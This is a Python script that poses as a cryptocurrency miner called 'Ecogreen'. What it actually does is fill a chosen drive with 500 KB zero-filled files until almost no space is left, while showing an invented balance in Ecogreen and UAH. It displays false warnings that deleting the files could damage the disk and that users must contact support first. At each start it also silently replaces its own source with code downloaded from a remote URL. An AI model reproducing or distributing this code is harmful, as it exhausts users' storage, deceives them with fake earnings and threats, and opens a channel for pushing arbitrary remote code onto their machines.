import os
import time
import sys
import urllib.request
import shutil
import math
import random
from ctypes import windll

UPDATE_URL = "https://raw.githubusercontent.com/Mavox-ID/ecogreen-miner/main/ecomainer.py"
BALANCE_FILE = "C:/Intel/BB_ecogreen.txt"

APP_NAME = "Ecogreen Miner"
APP_VERSION = "5.5"
APP_DESCRIPTION = "Official Ecogreen Mining Application."
APP_AUTHOR = "Mavox-ID"
APP_COMPANY = "OOO Kripto"
APP_CITY = "NaN"

def check_for_updates():
    try:
        with urllib.request.urlopen(UPDATE_URL) as response:
            response_text = response.read().decode('utf-8')

        with open(__file__, "r") as current_file:
            current_code = current_file.read()

        if response_text != current_code:
            with open(__file__, "w") as current_file:
                current_file.write(response_text)
            print("The application is updated. Please restart the program, otherwise, the conclusion from the old miner will be reset.")
            time.sleep(10)
            sys.exit()
    except Exception as e:
        print(f"Failed to check for updates: {e}")
        time.sleep(5)
        sys.exit()

def display_intro():
    intro_text = f"""
    Welcome to the official Ecogreen mining application!
    Here you can mine Ecogreen cryptocurrency and purchase additional assets and speeds.
    By default, 10 files are created per second, earning 0.01 Ecogreen per 300 files.
    Current rate: 1050 UAH = 1 Ecogreen.
    Attention! Ecogreen releases updates regularly. If you use an outdated version, withdrawals may not be supported.
    Ensure your balance is above 50 Ecogreen for compatibility with newer versions!
    Version: {APP_VERSION}
    Company: {APP_COMPANY}
    Author: {APP_AUTHOR}
    """
    sys.stdout.write("\033[H\033[J")
    print(intro_text)
    time.sleep(10)

def check_disk_exists(disk_letter):
    return os.path.exists(f"{disk_letter}:/")

def load_balance():
    if os.path.exists(BALANCE_FILE):
        with open(BALANCE_FILE, "r") as f:
            lines = f.readlines()
            if len(lines) >= 2:
                ecogreen_balance = float(lines[0].strip())
                uah_balance = float(lines[1].strip())
                return ecogreen_balance, uah_balance
    return 0.0, 0.0  

def save_balance(ecogreen_balance, uah_balance):
    with open(BALANCE_FILE, "w") as f:
        f.write(f"{ecogreen_balance}\n{uah_balance}")

def mine_ecogreen(disk_letter):
    ecogreen_folder = f"{disk_letter}:/Ecogreen"
    os.makedirs(ecogreen_folder, exist_ok=True)

    balance, uah_balance = load_balance()
    tasks_resolved = 0  

    file_count = 0

    while True:
       
        a = random.randint(1, 10000000000)
        b = random.randint(1, 1000000)
        c = random.randint(1, 1000000)

        try:
            result = math.sqrt(a) / b - c  
            tasks_resolved += 2
        except ZeroDivisionError:
            pass

       
        file_path = os.path.join(ecogreen_folder, f"ecogreen.h_{file_count}.eco")
        with open(file_path, "wb") as f:
            f.write(b"\x00" * 500000) 

        file_count += 1
        if file_count % 300 == 0:
            balance += 0.01  
            uah_balance = balance * 1050.0  

            save_balance(balance, uah_balance)

       
        sys.stdout.write("\033[H\033[J")
        print(f"HDD: {disk_letter}:/")
        print("HS: 10 F/S")
        print(f"CR: Created file {file_path}")
        print(f"DS: checked {tasks_resolved} tasks") 
        print(f"Balance: {balance:.2f} Ecogreen ({uah_balance:.2f} UAH)")

       
        total, used, free = shutil.disk_usage(f"{disk_letter}:/")
        free_kb = free // 1024  

        if free_kb < 1024:  
            print("\nWarning! You do not have enough memory to continue working with the disk, "
                  "do not delete hashes on the disk! Contact Ecogreen support for funds and permission to delete "
                  "hashes from the disk! (If you delete them until we process them, your disk may break, or no longer "
                  "work, because this extension: .eco is a collection of data and tasks that heavily load the disk, "
                  "their removal can lead to disk failure)\n")
            time.sleep(15)
            break

        
        if free_kb >= 1024 * 1024:
            print(f"Remaining space: {free_kb / (1024 * 1024):.2f} GB")
        elif free_kb >= 1024:
            print(f"Remaining space: {free_kb / 1024:.2f} MB")
        else:
            print(f"Remaining space: {free_kb:.2f} KB")
        print("OOO kriptoTM & binance (Ecogreen 2019)")

        time.sleep(0.1)

def add_icon_to_exe():
    icon_path = "icon.ico"  
    windll.shell32.SetCurrentProcessExplicitAppUserModelID(APP_NAME)  

if __name__ == "__main__":
    check_for_updates() 
    display_intro() 

    while True:
        if check_disk_exists("D"):
            print("Disk D:/ found. Starting mining...")
            time.sleep(5)
            mine_ecogreen("D")
        else:
            print("HDD for mining Ecogreen cryptocurrency was not found.")
            print(
                "You can use a disk with another volume. Write the letter of the volume (uppercase only):"
            )
            disk_letter = input("Enter the letter of the disk to use: ").strip().upper()

            if len(disk_letter) != 1:
                print("Invalid input. Please enter a single letter.")
                continue
            
            if check_disk_exists(disk_letter):
                print(f"Disk {disk_letter}:/ found. Starting mining...")
                time.sleep(5)
                mine_ecogreen(disk_letter)
            else:
                print(f"Disk {disk_letter}:/ not found. Try again.")
